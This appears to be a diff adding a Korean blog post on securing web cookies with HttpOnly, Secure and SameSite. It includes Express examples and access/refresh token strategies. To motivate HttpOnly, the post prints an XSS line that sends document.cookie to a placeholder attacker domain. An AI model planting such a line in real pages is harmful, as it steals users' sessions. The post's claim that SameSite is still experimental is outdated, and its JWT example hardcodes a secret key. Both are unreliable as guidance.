@@ -1,0 +1,190 @@
+---
+title: '웹 쿠키의 보안 속성 HttpOnly, Secure, SameSite 알아보기'
+description: '쿠키의 보안 속성인 HttpOnly, Secure, SameSite 속성을 알아보고 어떻게 웹 애플리케이션을 보호하는지 살펴보자.'
+published: '2025-04-11'
+tags: ['Web']
+---
+
+
+웹 개발을 하다 보면 Cookie는 사용자 데이터를 저장하고 세션을 관리하는 데 필수적인 도구다. 하지만 Cookie를 안전하게 관리하지 않으면 보안 위험이 발생할 수 있고, 이를 방지하기 위해 Cookie에는 HttpOnly, Secure, SameSite와 같은 속성이 존재한다.
+
+이번 글에서는 이 세 가지 속성의 역할과 중요성을 알아보고, 어떻게 설정해야 하는지 실용적인 예시와 함께 정리해 보았다.
+
+## HttpOnly 속성
+
+`HttpOnly` 속성은 Cookie를 클라이언트 측 스크립트에서 접근하지 못하도록 제한하는 속성이다. 이 속성을 설정하면, Cookie는 HTTP/HTTPS 요청을 통해서만 서버로 전송된다.
+
+**서버 설정 예시**
+
+```javascript
+// Node.js (Express) example
+res.cookie('sessionID', 'sanghyeon', { httpOnly: true });
+```
+
+헤더에는 다음과 같이 설정된다.
+
+```plaintext
+# Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
+Set-Cookie: sessionId=sanghyeon; HttpOnly
+```
+
+
+
+일반 쿠키는 다음과 같이 클라이언트 측 스크립트에서 접근할 수 있다.
+
+```javascript
+// Set-Cookie: normalCookie=thisisvisible; Path=/
+
+// JavaScript In Client
+console.log(document.cookie); // "normalCookie=thisisvisible"
+```
+
+하지만 HttpOnly 설정을 적용한 쿠키는 **클라이언트 측 스크립트에서 접근할 수 없다.**
+
+```javascript
+// Set-Cookie: secureSessionId=thiisnotvisible; HttpOnly; Path=/
+
+// JavaScript In Client
+console.log(document.cookie); // "normalCookie=thisisvisible" (HttpOnly 쿠키는 보이지 않음)
+```
+
+
+
+### HttpOnly를 통한 XSS 방지
+
+쿠키는 웹에서 사용자의 세션을 인증하기 위해 많이 사용된다. XSS(Cross-Site Scripting) 공격은 웹사이트에 악성 스크립트를 삽입해 사용자의 Cookie(예: 세션 ID)를 탈취할 수 있는 공격 방식이다.
+
+예를 들어, 악성 사용자가 다음과 같은 스크립트를 실행 시킬 수 있다.
+
+```javascript
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```
+
+HttpOnly를 설정하면, 공격자가 JavaScript로 Cookie에 접근할 수 없으므로 세션 하이재킹 같은 위협을 줄일 수 있다.
+
+
+
+## Secure 속성
+
+HttpOnly를 통해 클라이언트에서 접근을 막아도 Http를 통해 통신할 경우 중간자 공격을 통해 역시 탈취될 수 있다. Secure 속성을 사용하면 쿠키가 암호화된 HTTPS 연결을 통해서만 전송되므로 이러한 위험을 줄일 수 있다.
+
+**서버 설정 예시**
+
+```javascript
+// Node.js (Express) example
+res.cookie('sessionID', 'sanghyeon', { secure: true });
+```
+
+헤더에는 다음과 같이 설정된다.
+
+```plaintext
+# Set-Cookie: <cookie-name>=<cookie-value>; Secure
+Set-Cookie: sessionId=sanghyeon; Secure
+```
+
+> [!WARNING]
+> `Secure` 속성은 쿠키 자체를 암호화하는 것이 아니라, 암호화된 연결(HTTPS)에서만 전송되도록 제한하는 것이다. 따라서 Secure를 설정하더라도, 민감한 정보(비밀번호, 신용카드, 개인식별자 등)는 절대 쿠키에 담지 않는 것이 좋다. 이 옵션이 완벽한 보안은 아니기 때문이다.
+
+## SameSite 속성
+
+`SameSite` 속성은 쿠키가 크로스 사이트 요청과 함께 전송되는 방식을 제어한다. 이를 통해 CSRF(Cross-Site Request Forgery) 공격 및 원치 않는 정보 유출을 방지할 수 있다. 이 속성은 글을 쓰는 시점 (2025년 4월) 까지 실험적 기능으로 아직 모든 브라우저에서 지원하지 않는다.
+
+
+
+**서버 설정 예시**
+
+```javascript
+res.cookie('sessionId', 'sanghyeon', { sameSite: 'lax' }); // 기본값(Chrome 80+)
+```
+
+헤더에는 다음과 같이 설정된다.
+
+```plaintext
+Set-Cookie: sessionId=sanghyeon; SameSite=Lax
+```
+
+### 동작 방식
+
+`SameSite` 속성은 쿠키가 어떤 종류의 요청(동일 사이트 요청 vs. 크로스 사이트 요청)에 포함될 수 있는지를 결정한다. 아래와 같이 세 가지 값을 가질 수 있습니다.
+
+1. `Strict`: 가장 엄격한 설정. 쿠키는 오직 현재 웹사이트와 동일한 사이트(Same-Site)에서 시작된 요청에만 포함 된다. 다른 웹사이트에서 링크를 클릭하여 들어오는 경우 등 외부 사이트에서 시작된 요청에는 쿠키가 전송되지 않는다.
+2. `Lax`**(기본값)**: `Strict`보다 약간 완화된 설정. 기본적으로 `Strict`와 동일하게 동작하지만, 외부 링크를 클릭해 사이트로 이동하는 경우나 GET 요청에는 쿠키를 전송한다.
+3. `None`: 동일 사이트 요청, 크로스 사이트 요청 모두에 쿠키가 전송된다. 단, `SameSite=None`을 사용하려면 반드시 `Secure` 속성도 함께 설정해야 한다. 즉, HTTPS 연결에서만 작동한다. 주로 외부 서비스 연동, 광고 트래킹 등 크로스 사이트 컨텍스트에서 쿠키를 사용해야 하는 경우에 필요하다.
+
+
+
+## 인증을 위한 쿠키 관리 전략
+
+### 1. 이중 쿠키 전략: 보안과 접근성 모두 확보하기
+
+브라우저에서 쿠키에 접근해야 하는데 보안도 중요하다면, 두 종류의 쿠키를 사용하는 전략을 사용해볼 수 있겠다.
+
+```javascript
+// server side
+// 1. authentication token (HttpOnly)
+res.cookie('authToken', 'abc123.token.xyz789', {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict'
+});
+
+// 2. state for ui (accessible in javascript)
+res.cookie('userInfo', JSON.stringify({
+  isLoggedIn: true,
+  username: '사용자명',
+  role: '사용자'
+}));
+```
+
+- 실제 인증에 사용되는 토큰은 HttpOnly 쿠키로 보호
+- UI에 필요한 정보는 일반 쿠키로 자바스크립트 접근 허용
+
+### 2. JWT와 쿠키의 안전한 사용
+
+JWT는 로컬스토리지 보다 HttpOnly 쿠키에 저장하는 것이 더 안전하다.
+
+```javascript
+const token = jwt.sign({ userId: user.id }, 'secret_key', { expiresIn: '1h' });
+res.cookie('jwt', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict',
+  maxAge: 3600000 // 1시간
+});
+```
+
+### 3. 토큰 수명 관리와 리프레시 전략
+
+보안을 강화하기 위해 짧은 수명의 액세스 토큰과 긴 수명의 리프레시 토큰을 조합하는 전략도 있다.
+
+```javascript
+// access token (short lifetime)
+res.cookie('accessToken', accessToken, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict',
+  maxAge: 900000 // 15분
+});
+
+// refresh token (long lifetime)
+res.cookie('refreshToken', refreshToken, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict',
+  path: '/api/refresh',
+  maxAge: 7 * 24 * 60 * 60 * 1000 // 7일
+});
+```
+- 액세스 토큰이 탈취되더라도 짧은 시간 내에 만료
+- 리프레시 토큰은 특정 API 경로로만 제한해 노출 최소화
+- 주기적인 토큰 갱신으로 보안 강화
+
+
+
+## 마무리
+
+웹에서 쿠키는 사용자 인증 및 세션 관리에 필수적인 요소다. 이 글에서 알아본 것처럼 HttpOnly, Secure, SameSite 속성을 적절히 사용하면 XSS, CSRF, 세션 하이재킹 등 다양한 공격으로부터 보호할 수 있다.
+
+웹 개발자로서 사용자의 데이터와 프라이버시를 보호할 책임이 있으므로. 쿠키의 보안 속성을 이해하고 적절히 사용하자!
+
